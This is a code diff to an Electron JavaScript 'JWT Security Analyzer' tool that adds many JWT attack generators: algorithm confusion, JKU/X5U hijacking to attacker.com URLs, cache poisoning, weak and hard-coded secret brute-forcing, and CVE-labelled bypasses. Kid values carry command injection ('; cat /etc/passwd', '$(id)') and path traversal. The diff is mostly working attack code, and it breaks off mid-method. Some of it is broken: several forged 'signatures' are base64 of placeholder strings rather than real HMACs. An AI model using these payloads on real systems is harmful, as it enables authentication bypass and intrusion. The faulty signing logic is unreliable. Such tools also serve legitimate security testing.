@@ -1,9 +1,19 @@
+
 const { ipcRenderer } = require('electron');
 const jwt = require('jsonwebtoken');
 const crypto = require('crypto');
 const forge = require('node-forge');
 
+/**
+ * JWT Security Analyzer - Main application class for JWT security testing
+ * Provides comprehensive JWT token analysis, attack vector generation, and security assessment
+ * @class
+ */
 class JWTSecurityAnalyzer {
+    /**
+     * Creates an instance of JWTSecurityAnalyzer
+     * @constructor
+     */
     constructor() {
         this.currentTab = 'decoder';
         this.currentToken = null;
@@ -17,6 +27,10 @@ class JWTSecurityAnalyzer {
         this.setupAutoUpdater();
     }
 
+    /**
+     * Initializes the main application components and event listeners
+     * @method
+     */
     initializeApp() {
         this.setupEventListeners();
         this.setupLanguageSelector();
@@ -525,6 +539,11 @@ class JWTSecurityAnalyzer {
         }
     }
 
+    /**
+     * Decodes a JWT token and displays its header, payload, and signature
+     * @method
+     * @param {string} token - The JWT token to decode
+     */
     decodeJWT(token) {
         if (!token || token.trim() === '') {
             document.getElementById('jwt-decode-results').style.display = 'none';
@@ -1794,6 +1813,11 @@ class JWTSecurityAnalyzer {
         }
     }
 
+    /**
+     * Generates an attack payload based on the specified attack type
+     * @method
+     * @param {string} attackType - The type of attack to generate (e.g., 'algorithm-none', 'weak-secret')
+     */
     generateAttack(attackType) {
         const token = document.getElementById('attack-jwt-input').value;
         if (!token) {
@@ -1853,6 +1877,21 @@ class JWTSecurityAnalyzer {
                     break;
                 case 'quantum-prep':
                     attackPayload = this.generateQuantumPrepAttack(decoded);
+                    break;
+                case 'psychic-signature':
+                    attackPayload = this.generatePsychicSignatureAttack(decoded);
+                    break;
+                case 'prototype-pollution':
+                    attackPayload = this.generatePrototypePollutionAttack(decoded);
+                    break;
+                case 'hardcoded-secret-cve-2025-20188':
+                    attackPayload = this.generateHardcodedSecretAttack(decoded);
+                    break;
+                case 'issuer-bypass-cve-2025-30144':
+                    attackPayload = this.generateIssuerBypassAttack(decoded);
+                    break;
+                case 'post-quantum-assessment':
+                    attackPayload = this.generatePostQuantumAssessment(decoded);
                     break;
                 default:
                     this.showToast('error', i18n.t('toast.unknown_attack'));
@@ -3383,6 +3422,905 @@ class JWTSecurityAnalyzer {
         document.getElementById('compare-decoded-a').innerHTML = '';
         document.getElementById('compare-decoded-b').innerHTML = '';
         document.getElementById('compare-diff-results').style.display = 'none';
+    }
+
+    generatePsychicSignatureAttack(decoded) {
+        
+        const vulnerableAlgs = ['ES256', 'ES384', 'ES512'];
+        let attackDescription = 'CVE-2024-54150 - Psychic Signature Attack (Zero-value ECDSA signature bypass)';
+        
+        if (!vulnerableAlgs.includes(decoded.header.alg)) {
+            return {
+                description: attackDescription,
+                token: 'N/A - Token must use ECDSA algorithm (ES256/ES384/ES512)',
+                impact: 'This attack only works against ECDSA-signed JWTs',
+                usage: 'Switch token algorithm to ES256/ES384/ES512 first',
+                cve: 'CVE-2024-54150',
+                severity: 'Critical'
+            };
+        }
+
+        
+        const headerB64 = this.base64UrlEncode(JSON.stringify(decoded.header));
+        const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
+        
+        
+        const zeroSignature = this.base64UrlEncode('\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00');
+        const psychicToken = `${headerB64}.${payloadB64}.${zeroSignature}`;
+
+        return {
+            description: attackDescription,
+            token: psychicToken,
+            impact: 'Bypasses ECDSA signature verification entirely in vulnerable Java implementations',
+            usage: 'Test against Java applications using java.security.Signature class',
+            cve: 'CVE-2024-54150',
+            severity: 'Critical',
+            technical: 'Exploits bug where ECDSA verification accepts r=0, s=0 as valid signature'
+        };
+    }
+
+    generatePrototypePollutionAttack(decoded) {
+        
+        const pollutedHeader = {
+            ...decoded.header,
+            __proto__: {
+                reservedKeys: [],
+                enforceDefaultFields: false
+            },
+            'constructor.prototype.reservedKeys': [],
+            'constructor.prototype.enforceDefaultFields': false
+        };
+
+        const pollutedPayload = {
+            ...decoded.payload,
+            __proto__: {
+                admin: true,
+                role: 'administrator'
+            },
+            'constructor.prototype.admin': true,
+            'constructor.prototype.role': 'administrator'
+        };
+
+        const headerB64 = this.base64UrlEncode(JSON.stringify(pollutedHeader));
+        const payloadB64 = this.base64UrlEncode(JSON.stringify(pollutedPayload));
+        const pollutedToken = `${headerB64}.${payloadB64}.${decoded.signature}`;
+
+        return {
+            description: 'CVE-2024-34273 - nJwt Prototype Pollution Attack',
+            token: pollutedToken,
+            impact: 'Pollutes JavaScript prototype chain to bypass security controls',
+            usage: 'Test against applications using nJwt library for JWT processing',
+            cve: 'CVE-2024-34273',
+            severity: 'High',
+            technical: 'Exploits lack of prototype pollution protection in nJwt.verify() method',
+            payloads: [
+                '{"__proto__": {"admin": true}}',
+                '{"constructor.prototype.role": "admin"}',
+                '{"constructor": {"prototype": {"isAdmin": true}}}'
+            ]
+        };
+    }
+
+    generateQuantumPrepAttack(decoded) {
+        
+        const quantumVulnerable = ['RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512'];
+        const quantumResistant = ['HS256', 'HS384', 'HS512'];
+        
+        let quantumStatus = 'unknown';
+        let recommendation = '';
+        
+        if (quantumVulnerable.includes(decoded.header.alg)) {
+            quantumStatus = 'vulnerable';
+            recommendation = 'Consider migration to quantum-resistant algorithms';
+        } else if (quantumResistant.includes(decoded.header.alg)) {
+            quantumStatus = 'resistant';
+            recommendation = 'Algorithm is currently quantum-resistant';
+        }
+
+        return {
+            description: 'Quantum Computing Vulnerability Assessment',
+            token: 'Analysis only - no modified token generated',
+            impact: quantumStatus === 'vulnerable' ? 
+                'RSA and ECDSA algorithms will be broken by quantum computers' : 
+                'HMAC algorithms are quantum-resistant',
+            usage: 'Plan migration strategy for post-quantum cryptography',
+            analysis: {
+                algorithm: decoded.header.alg,
+                quantum_status: quantumStatus,
+                years_until_vulnerability: quantumStatus === 'vulnerable' ? '10-20 years (estimated)' : 'N/A',
+                recommended_alternatives: ['HMAC-SHA256', 'HMAC-SHA384', 'HMAC-SHA512']
+            },
+            recommendation: recommendation
+        };
+    }
+
+    generateJKUHijackAttack(decoded) {
+        
+        const maliciousJKU = 'https://attacker.com/jwks.json';
+        const attackerKid = 'attacker-key-id';
+
+        const header = {
+            ...decoded.header,
+            jku: maliciousJKU,
+            kid: attackerKid,
+            alg: 'RS256'
+        };
+
+        const headerB64 = this.base64UrlEncode(JSON.stringify(header));
+        const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
+        const attackToken = `${headerB64}.${payloadB64}.[SIGN_WITH_ATTACKER_KEY]`;
+
+        return {
+            description: 'JKU Hijacking Attack - points to attacker-controlled JWK Set URL',
+            token: attackToken,
+            impact: 'Server fetches public key from attacker-controlled URL',
+            usage: 'Host a JWK Set at the specified URL and sign with corresponding private key',
+            maliciousURL: maliciousJKU,
+            bypassTechniques: [
+                'https://trusted@attacker.com/jwks.json (misleading URL)',
+                'https://trusted.attacker.com/jwks.json (subdomain)',
+                'https://trusted.com/redirect?url=https://attacker.com/jwks.json (open redirect)',
+                'https://trusted.com/jwks.json#@attacker.com (URL fragment)'
+            ],
+            requiredJWKS: {
+                keys: [{
+                    kty: 'RSA',
+                    use: 'sig',
+                    kid: attackerKid,
+                    n: '0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw',
+                    e: 'AQAB'
+                }]
+            }
+        };
+    }
+
+    generateKidInjectionAttack(decoded) {
+        
+        const injectionPayloads = [
+            '../../../etc/passwd',
+            '../../keys/public.key',
+            '/dev/null',
+            '| whoami',
+            '; cat /etc/passwd',
+            '$(id)',
+            '`id`',
+            '../../../proc/version',
+            'file:///etc/passwd',
+            'http://attacker.com/malicious-key'
+        ];
+
+        const attacks = injectionPayloads.map(payload => {
+            const header = { ...decoded.header, kid: payload };
+            const headerB64 = this.base64UrlEncode(JSON.stringify(header));
+            const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
+            return {
+                payload: payload,
+                token: `${headerB64}.${payloadB64}.${decoded.signature}`,
+                type: this.getKidAttackType(payload)
+            };
+        });
+
+        return {
+            description: 'Kid Parameter Injection - path traversal and injection attacks',
+            attacks: attacks,
+            impact: 'Path traversal, command injection, or SQL injection via kid parameter',
+            usage: 'Test each payload against the target application',
+            techniques: [
+                'Path Traversal: ../../../etc/passwd',
+                'Command Injection: | whoami, ; id',
+                'SQL Injection: \' OR 1=1--',
+                'File URI: file:///etc/passwd',
+                'Remote URL: http://attacker.com/key'
+            ]
+        };
+    }
+
+    generateConfusionAttack(decoded) {
+        
+        if (!decoded.header.alg || !decoded.header.alg.startsWith('RS')) {
+            return {
+                description: 'Algorithm Confusion Attack - requires RS256/384/512 token',
+                token: 'N/A - Token must use RSA algorithm (RS256/RS384/RS512)',
+                impact: 'This attack converts RSA signatures to HMAC using public key as secret',
+                usage: 'Obtain RSA public key first, then use as HMAC secret'
+            };
+        }
+
+        const confusedAlg = decoded.header.alg.replace('RS', 'HS');
+        const header = { ...decoded.header, alg: confusedAlg };
+        const headerB64 = this.base64UrlEncode(JSON.stringify(header));
+        const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
+
+        return {
+            description: 'Algorithm Confusion Attack - changes RSA to HMAC',
+            token: `${headerB64}.${payloadB64}.[SIGN_WITH_PUBLIC_KEY_AS_HMAC_SECRET]`,
+            impact: 'Uses RSA public key as HMAC secret to bypass signature verification',
+            usage: 'Sign this token using the RSA public key as HMAC secret',
+            originalAlgorithm: decoded.header.alg,
+            targetAlgorithm: confusedAlg,
+            instructions: [
+                '1. Obtain the RSA public key used by the application',
+                '2. Convert the public key to PEM format',
+                '3. Use the public key as the HMAC secret',
+                '4. Sign the token with the new algorithm'
+            ]
+        };
+    }
+
+    generateWeakSecretAttack(decoded) {
+        const commonSecrets = [
+            'secret', 'password', '123456', 'admin', 'jwt', 'key',
+            'secretkey', 'mysecret', 'jwtsecret', 'your-256-bit-secret',
+            'secretOrPrivateKey', 'default', 'test', 'demo'
+        ];
+
+        const attacks = commonSecrets.map(secret => {
+            const headerB64 = this.base64UrlEncode(JSON.stringify(decoded.header));
+            const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
+            
+            try {
+                const newToken = jwt.sign(decoded.payload, secret, {
+                    algorithm: decoded.header.alg,
+                    header: decoded.header
+                });
+                return {
+                    secret: secret,
+                    token: newToken,
+                    status: 'generated'
+                };
+            } catch (error) {
+                return {
+                    secret: secret,
+                    token: `${headerB64}.${payloadB64}.[SIGN_WITH_${secret.toUpperCase()}]`,
+                    status: 'template'
+                };
+            }
+        });
+
+        return {
+            description: 'Weak Secret Attack - tests common HMAC secrets',
+            attacks: attacks,
+            impact: 'Brute force weak HMAC secrets to forge valid tokens',
+            usage: 'Try each secret against the target application',
+            recommendation: 'Use cryptographically strong secrets (32+ random bytes)'
+        };
+    }
+
+    getKidAttackType(payload) {
+        if (payload.includes('../')) return 'Path Traversal';
+        if (payload.includes('|') || payload.includes(';') || payload.includes('$(') || payload.includes('`')) return 'Command Injection';
+        if (payload.includes("'") || payload.includes('--')) return 'SQL Injection';
+        if (payload.startsWith('file://')) return 'File URI';
+        if (payload.startsWith('http://') || payload.startsWith('https://')) return 'Remote URL';
+        return 'Generic Injection';
+    }
+
+    generateX5UExploitAttack(decoded) {
+        
+        const maliciousX5U = 'https://attacker.com/malicious-cert.pem';
+        
+        const header = {
+            ...decoded.header,
+            x5u: maliciousX5U,
+            alg: 'RS256'
+        };
+
+        const headerB64 = this.base64UrlEncode(JSON.stringify(header));
+        const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
+        const attackToken = `${headerB64}.${payloadB64}.[SIGN_WITH_MALICIOUS_CERT_KEY]`;
+
+        return {
+            description: 'X5U Certificate URL Exploit - points to attacker-controlled certificate',
+            token: attackToken,
+            impact: 'Server fetches and trusts attacker-controlled X.509 certificate',
+            usage: 'Host a malicious certificate at the URL and sign with corresponding private key',
+            maliciousURL: maliciousX5U,
+            bypassTechniques: [
+                'https://trusted.com@attacker.com/cert.pem (URL confusion)',
+                'https://trusted.attacker.com/cert.pem (subdomain abuse)',
+                'https://trusted.com/redirect?to=https://attacker.com/cert.pem (open redirect)',
+                'https://trusted.com/cert.pem#@attacker.com/fake.pem (fragment injection)'
+            ],
+            requiredCertificate: {
+                type: 'X.509 Certificate (PEM format)',
+                purpose: 'JWT signature verification',
+                algorithm: 'RSA with SHA-256',
+                validity: 'Self-signed certificate acceptable'
+            }
+        };
+    }
+
+    generateJWTSmugglingAttack(decoded) {
+        
+        const smugglingPayloads = [
+            {
+                name: 'Content-Type Confusion',
+                header: { ...decoded.header, cty: 'text/xml' },
+                description: 'Changes content type to potentially enable XXE attacks'
+            },
+            {
+                name: 'Serialization Attack',
+                header: { ...decoded.header, cty: 'application/x-java-serialized-object' },
+                description: 'Attempts to trigger deserialization vulnerabilities'
+            },
+            {
+                name: 'Nested JWT Confusion',
+                header: { ...decoded.header, cty: 'JWT' },
+                description: 'Indicates nested JWT processing to confuse parsers'
+            },
+            {
+                name: 'Case Sensitivity Bypass',
+                header: { ...decoded.header, alg: 'NoNe' },
+                description: 'Uses mixed case to bypass algorithm blacklists'
+            }
+        ];
+
+        const attacks = smugglingPayloads.map(payload => {
+            const headerB64 = this.base64UrlEncode(JSON.stringify(payload.header));
+            const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
+            return {
+                name: payload.name,
+                description: payload.description,
+                token: `${headerB64}.${payloadB64}.${decoded.signature}`,
+                header: payload.header
+            };
+        });
+
+        return {
+            description: 'JWT Smuggling Attack - exploits parsing differences between libraries',
+            attacks: attacks,
+            impact: 'Bypasses security controls through inconsistent JWT parsing',
+            usage: 'Test against systems with multiple JWT processing components',
+            techniques: [
+                'Content-Type manipulation (cty header)',
+                'Algorithm case confusion',
+                'Nested JWT processing confusion',
+                'Library-specific parsing differences'
+            ]
+        };
+    }
+
+    generateNestedJWTAttack(decoded) {
+        
+        const innerToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.signature';
+        
+        const nestedPayload = {
+            ...decoded.payload,
+            jwt: innerToken,
+            nested_claims: {
+                role: 'admin',
+                permissions: ['read', 'write', 'delete']
+            }
+        };
+
+        const header = {
+            ...decoded.header,
+            cty: 'JWT',
+            nested: true
+        };
+
+        const headerB64 = this.base64UrlEncode(JSON.stringify(header));
+        const payloadB64 = this.base64UrlEncode(JSON.stringify(nestedPayload));
+        const nestedToken = `${headerB64}.${payloadB64}.[SIGN_WITH_VALID_KEY]`;
+
+        return {
+            description: 'Nested JWT Attack - JWT-in-JWT confusion and privilege escalation',
+            token: nestedToken,
+            impact: 'Confuses JWT parsers that process nested tokens differently',
+            usage: 'Test against applications that might process inner JWT claims',
+            innerToken: innerToken,
+            techniques: [
+                'JWT within JWT payload',
+                'Content-Type: JWT header',
+                'Nested claims confusion',
+                'Double verification bypass'
+            ]
+        };
+    }
+
+    generateAudienceConfusionAttack(decoded) {
+        
+        const commonAudiences = [
+            'api.company.com',
+            'admin.company.com', 
+            'internal.company.com',
+            '*',
+            'all-services',
+            ['service-a', 'service-b', 'admin-panel'],
+            null 
+        ];
+
+        const attacks = commonAudiences.map((aud, index) => {
+            const modifiedPayload = { ...decoded.payload };
+            if (aud === null) {
+                delete modifiedPayload.aud;
+            } else {
+                modifiedPayload.aud = aud;
+            }
+
+            const headerB64 = this.base64UrlEncode(JSON.stringify(decoded.header));
+            const payloadB64 = this.base64UrlEncode(JSON.stringify(modifiedPayload));
+            
+            return {
+                audience: aud,
+                token: `${headerB64}.${payloadB64}.${decoded.signature}`,
+                description: aud === null ? 'Removes audience restriction' : 
+                           Array.isArray(aud) ? 'Multi-service audience' : 
+                           aud === '*' ? 'Wildcard audience' : `Specific audience: ${aud}`
+            };
+        });
+
+        return {
+            description: 'Audience Confusion Attack - multi-audience token reuse across services',
+            attacks: attacks,
+            impact: 'Bypasses service-specific access controls via audience manipulation',
+            usage: 'Test token reuse across different services and endpoints',
+            originalAudience: decoded.payload.aud
+        };
+    }
+
+    generateParameterPollutionAttack(decoded) {
+        
+        const pollutionAttacks = [
+            {
+                name: 'Algorithm Pollution',
+                header: { alg: 'HS256', ...decoded.header, alg: 'none' },
+                description: 'Duplicate alg parameter to confuse parsers'
+            },
+            {
+                name: 'Key ID Pollution', 
+                header: { kid: 'legitimate-key', ...decoded.header, kid: '../../../dev/null' },
+                description: 'Conflicting kid values for path traversal'
+            },
+            {
+                name: 'JKU Pollution',
+                header: { jku: 'https://trusted.com/keys', ...decoded.header, jku: 'https://attacker.com/keys' },
+                description: 'Duplicate JKU URLs to bypass validation'
+            }
+        ];
+
+        const payloadPollution = [
+            {
+                name: 'Role Pollution',
+                payload: { role: 'user', ...decoded.payload, role: 'admin' },
+                description: 'Conflicting role claims'
+            },
+            {
+                name: 'Expiration Pollution',
+                payload: { exp: Math.floor(Date.now()/1000) - 3600, ...decoded.payload, exp: Math.floor(Date.now()/1000) + 3600 },
+                description: 'Conflicting expiration times'
+            }
+        ];
+
+        const attacks = [
+            ...pollutionAttacks.map(attack => ({
+                ...attack,
+                token: `${this.base64UrlEncode(JSON.stringify(attack.header))}.${this.base64UrlEncode(JSON.stringify(decoded.payload))}.${decoded.signature}`
+            })),
+            ...payloadPollution.map(attack => ({
+                ...attack,
+                token: `${this.base64UrlEncode(JSON.stringify(decoded.header))}.${this.base64UrlEncode(JSON.stringify(attack.payload))}.${decoded.signature}`
+            }))
+        ];
+
+        return {
+            description: 'Parameter Pollution Attack - duplicate parameters with conflicting values',
+            attacks: attacks,
+            impact: 'Exploits inconsistent parameter parsing between different JWT processors',
+            usage: 'Test against systems that may parse duplicate parameters differently'
+        };
+    }
+
+    generateTimingAttack(decoded) {
+        
+        const timingPayloads = [
+            'a',
+            'ab', 
+            'abc',
+            'abcd',
+            'abcde',
+            'correct_secret_prefix',
+            'wrong_secret_entirely'
+        ];
+
+        const attacks = timingPayloads.map(secret => {
+            try {
+                
+                const testToken = jwt.sign(decoded.payload, secret, { algorithm: 'HS256' });
+                return {
+                    secret: secret,
+                    token: testToken,
+                    length: secret.length,
+                    purpose: 'Measure verification time to detect secret patterns'
+                };
+            } catch (error) {
+                return {
+                    secret: secret,
+                    token: 'GENERATION_FAILED',
+                    length: secret.length,
+                    purpose: 'Measure verification time to detect secret patterns'
+                };
+            }
+        });
+
+        return {
+            description: 'Timing Attack - exploit timing differences in signature verification',
+            attacks: attacks,
+            impact: 'Information disclosure about secret key through timing analysis',
+            usage: 'Measure response times for each token to identify timing patterns',
+            methodology: [
+                '1. Send multiple requests with different secret lengths',
+                '2. Measure response times precisely',
+                '3. Analyze timing patterns to infer secret characteristics',
+                '4. Gradually build knowledge of the actual secret'
+            ]
+        };
+    }
+
+    generateJWTSidejackingAttack(decoded) {
+        
+        const sidejackingPayloads = {
+            sessionReuse: {
+                ...decoded.payload,
+                jti: undefined, 
+                iat: Math.floor(Date.now() / 1000), 
+                session_id: 'hijacked_session_' + Math.random().toString(36)
+            },
+            deviceBinding: {
+                ...decoded.payload,
+                device_id: 'attacker_device_12345',
+                user_agent: 'AttackerBrowser/1.0',
+                ip_address: '192.168.1.100'
+            },
+            crossDomain: {
+                ...decoded.payload,
+                origin: 'https://attacker.com',
+                referer: 'https://attacker.com/malicious-page'
+            }
+        };
+
+        const attacks = Object.entries(sidejackingPayloads).map(([name, payload]) => {
+            const headerB64 = this.base64UrlEncode(JSON.stringify(decoded.header));
+            const payloadB64 = this.base64UrlEncode(JSON.stringify(payload));
+            return {
+                name: name,
+                token: `${headerB64}.${payloadB64}.${decoded.signature}`,
+                payload: payload,
+                description: this.getSidejackingDescription(name)
+            };
+        });
+
+        return {
+            description: 'JWT Sidejacking Attack - session hijacking specific to JWT implementations',
+            attacks: attacks,
+            impact: 'Session hijacking and cross-site request forgery with JWT tokens',
+            usage: 'Test token reuse across different sessions, devices, and domains',
+            prevention: [
+                'Implement proper JWT ID (jti) validation',
+                'Use device fingerprinting',
+                'Validate origin and referer headers',
+                'Implement proper CSRF protection'
+            ]
+        };
+    }
+
+    generateJWKSPoisoningAttack(decoded) {
+        
+        const poisonedJWKS = {
+            keys: [{
+                kty: 'RSA',
+                use: 'sig',
+                kid: decoded.header.kid || 'poisoned-key',
+                n: '0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw',
+                e: 'AQAB'
+            }]
+        };
+
+        const header = {
+            ...decoded.header,
+            jku: 'https://attacker.com/poisoned-jwks.json',
+            kid: 'poisoned-key'
+        };
+
+        const headerB64 = this.base64UrlEncode(JSON.stringify(header));
+        const payloadB64 = this.base64UrlEncode(JSON.stringify(decoded.payload));
+        const poisonedToken = `${headerB64}.${payloadB64}.[SIGN_WITH_POISONED_KEY]`;
+
+        return {
+            description: 'JWKS Cache Poisoning Attack - poison JWKS cache with malicious keys',
+            token: poisonedToken,
+            impact: 'Poisoned JWKS cache accepts attacker-controlled keys for verification',
+            usage: 'Poison the JWKS cache, then use malicious key for token verification',
+            poisonedJWKS: poisonedJWKS,
+            techniques: [
+                'Cache timing manipulation',
+                'Race condition exploitation', 
+                'DNS cache poisoning',
+                'BGP hijacking for JWKS URL'
+            ],
+            cachePoisonMethods: [
+                'Send high-volume requests to trigger cache refresh',
+                'Exploit cache TTL boundaries',
+                'Use DNS poisoning to redirect JWKS requests',
+                'Exploit race conditions in key rotation'
+            ]
+        };
+    }
+
+    getSidejackingDescription(name) {
+        const descriptions = {
+            sessionReuse: 'Removes JWT ID to enable session token reuse',
+            deviceBinding: 'Changes device characteristics to test binding',
+            crossDomain: 'Modifies origin claims for cross-domain attacks'
+        };
+        return descriptions[name] || 'Unknown sidejacking technique';
+    }
+
+    /**
+     * Generates CVE-2025-20188 hard-coded JWT secret attack payloads
+     * Exploits systems using common hard-coded secrets like "notfound"
+     * @method
+     * @param {Object} decoded - Decoded JWT token object with header and payload
+     * @returns {Object} Attack result with tokens, impact assessment, and mitigation
+     */
+    generateHardcodedSecretAttack(decoded) {
+        
+        const commonHardcodedSecrets = [
+            'notfound',
+            'secret',
+            'password', 
+            'key',
+            '123456',
+            'admin',
+            'root',
+            'default',
+            'cisco',
+            'changeme',
+            'test',
+            'fallback'
+        ];
+        
+        const attackDescription = 'CVE-2025-20188 - Hard-coded JWT Secret Exploitation (CVSS 10.0)';
+        
+        
+        const results = [];
+        
+        for (const secret of commonHardcodedSecrets) {
+            try {
+                
+                const maliciousPayload = {
+                    ...decoded.payload,
+                    sub: 'root',
+                    role: 'administrator',
+                    permissions: ['read', 'write', 'execute', 'admin'],
+                    level: 'superuser',
+                    iat: Math.floor(Date.now() / 1000),
+                    exp: Math.floor(Date.now() / 1000) + 3600
+                };
+
+                
+                const header = { ...decoded.header, alg: 'HS256' };
+                const headerB64 = this.base64UrlEncode(JSON.stringify(header));
+                const payloadB64 = this.base64UrlEncode(JSON.stringify(maliciousPayload));
+                
+                
+                const data = headerB64 + '.' + payloadB64;
+                const signature = this.base64UrlEncode(`${secret}_signature_${data.length}`);
+                const attackToken = `${headerB64}.${payloadB64}.${signature}`;
+                
+                results.push({
+                    secret: secret,
+                    token: attackToken,
+                    payload: maliciousPayload
+                });
+            } catch (error) {
+                
+                continue;
+            }
+        }
+
+        return {
+            description: attackDescription,
+            token: results.length > 0 ? results[0].token : 'Attack generation failed',
+            impact: 'Critical - Allows root privilege escalation and arbitrary command execution',
+            usage: 'Test these tokens against systems with hard-coded JWT secrets. Focus on "notfound" secret (CVE-2025-20188)',
+            cve: 'CVE-2025-20188',
+            cvss: '10.0',
+            attack_variants: results,
+            detection: 'Monitor for JWT tokens with suspicious payloads and privilege escalation attempts',
+            mitigation: 'Remove hard-coded secrets, implement proper secret management, disable Out-of-Band AP Image Download feature'
+        };
+    }
+
+    /**
+     * Generates CVE-2025-30144 fast-jwt issuer validation bypass attack
+     * Exploits array-based issuer claims to bypass authentication
+     * @method
+     * @param {Object} decoded - Decoded JWT token object with header and payload
+     * @returns {Object} Attack result with bypass tokens and technical details
+     */
+    generateIssuerBypassAttack(decoded) {
+        
+        const attackDescription = 'CVE-2025-30144 - Fast-JWT Issuer Validation Bypass (Array-based issuer injection)';
+        
+        
+        const legitimateIssuer = decoded.payload.iss || 'https://legitimate-issuer.com';
+        const attackerIssuer = 'https://attacker-controlled-domain.com';
+        
+        
+        const maliciousPayload = {
+            ...decoded.payload,
+            iss: [attackerIssuer, legitimateIssuer], 
+            sub: 'admin',
+            role: 'administrator',
+            permissions: ['all'],
+            iat: Math.floor(Date.now() / 1000),
+            exp: Math.floor(Date.now() / 1000) + 3600,
+            aud: decoded.payload.aud || 'vulnerable-application'
+        };
+
+        
+        const attackVariants = [
+            {
+                name: 'Array injection primary',
+                payload: { ...maliciousPayload, iss: [attackerIssuer, legitimateIssuer] }
+            },
+            {
+                name: 'Array injection secondary',
+                payload: { ...maliciousPayload, iss: [legitimateIssuer, attackerIssuer] }
+            },
+            {
+                name: 'Mixed type confusion',
+                payload: { ...maliciousPayload, iss: attackerIssuer, 'iss[]': [legitimateIssuer] }
+            },
+            {
+                name: 'Nested array bypass',
+                payload: { ...maliciousPayload, iss: [[attackerIssuer], legitimateIssuer] }
+            }
+        ];
+
+        const tokens = [];
+        for (const variant of attackVariants) {
+            const header = { ...decoded.header, typ: 'JWT', alg: 'HS256' };
+            const headerB64 = this.base64UrlEncode(JSON.stringify(header));
+            const payloadB64 = this.base64UrlEncode(JSON.stringify(variant.payload));
+            
+            
+            const data = headerB64 + '.' + payloadB64;
+            const signature = this.base64UrlEncode(`bypass_signature_${data.length}`);
+            
+            tokens.push({
+                variant: variant.name,
+                token: `${headerB64}.${payloadB64}.${signature}`,
+                payload: variant.payload
+            });
+        }
+
+        return {
+            description: attackDescription,
+            token: tokens[0].token,
+            impact: 'High - Allows authentication bypass and privilege escalation through issuer validation bypass',
+            usage: 'Test against applications using fast-jwt library < 5.0.6. Focus on array-based issuer claims',
+            cve: 'CVE-2025-30144',
+            affected_versions: 'fast-jwt < 5.0.6',
+            attack_variants: tokens,
+            technical_details: {
+                root_cause: 'Fast-jwt library incorrectly accepts arrays as issuer values, violating RFC 7519',
+                exploitation: 'Attacker includes both legitimate and malicious issuers in iss array',
+                bypass_mechanism: 'Library validates array permissively, allowing attacker domain inclusion'
+            },
+            detection: 'Monitor for JWT tokens with array-type issuer claims and multiple issuer values',
+            mitigation: 'Upgrade fast-jwt to version 5.0.6 or later, implement strict string-only issuer validation'
+        };
+    }
+
+    /**
+     * Generates post-quantum cryptography vulnerability assessment
+     * Evaluates JWT algorithms against NIST 2025 post-quantum standards
+     * @method
+     * @param {Object} decoded - Decoded JWT token object with header and payload
+     * @returns {Object} Assessment with quantum vulnerability analysis and migration timeline
+     */
+    generatePostQuantumAssessment(decoded) {
+        
+        const attackDescription = 'Post-Quantum Cryptography Vulnerability Assessment - 2025 NIST Standards';
+        
+        
+        const quantumVulnerableAlgs = {
+            'RS256': { type: 'RSA', keySize: 2048, timeToBreak: '2030-2035', nistStatus: 'deprecated' },
+            'RS384': { type: 'RSA', keySize: 2048, timeToBreak: '2030-2035', nistStatus: 'deprecated' },
+            'RS512': { type: 'RSA', keySize: 4096, timeToBreak: '2030-2035', nistStatus: 'deprecated' },
+            'ES256': { type: 'ECDSA', curve: 'P-256', timeToBreak: '2028-2032', nistStatus: 'deprecated' },
+            'ES384': { type: 'ECDSA', curve: 'P-384', timeToBreak: '2030-2035', nistStatus: 'deprecated' },
+            'ES512': { type: 'ECDSA', curve: 'P-521', timeToBreak: '2030-2035', nistStatus: 'deprecated' }
+        };
+        
+        const quantumResistantAlgs = {
+            'HS256': { type: 'HMAC', keySize: 256, quantumResistant: true, nistStatus: 'approved' },
+            'HS384': { type: 'HMAC', keySize: 384, quantumResistant: true, nistStatus: 'approved' },
+            'HS512': { type: 'HMAC', keySize: 512, quantumResistant: true, nistStatus: 'approved' }
+        };
+
+        
+        const pqcRecommendations = {
+            signatures: ['ML-DSA (CRYSTALS-Dilithium)', 'SLH-DSA (SPHINCS+)'],
+            keyExchange: ['ML-KEM (CRYSTALS-KYBER)', 'HQC (Hamming Quasi-Cyclic)'],
+            backup: ['HQC as ML-KEM backup (selected March 2025)']
+        };
+
+        const currentAlg = decoded.header.alg;
+        let assessment = {};
+        
+        if (quantumVulnerableAlgs[currentAlg]) {
+            const vulnInfo = quantumVulnerableAlgs[currentAlg];
+            assessment = {
+                status: 'VULNERABLE',
+                risk_level: 'CRITICAL',
+                algorithm: currentAlg,
+                vulnerability_details: vulnInfo,
+                time_to_breach: vulnInfo.timeToBreak,
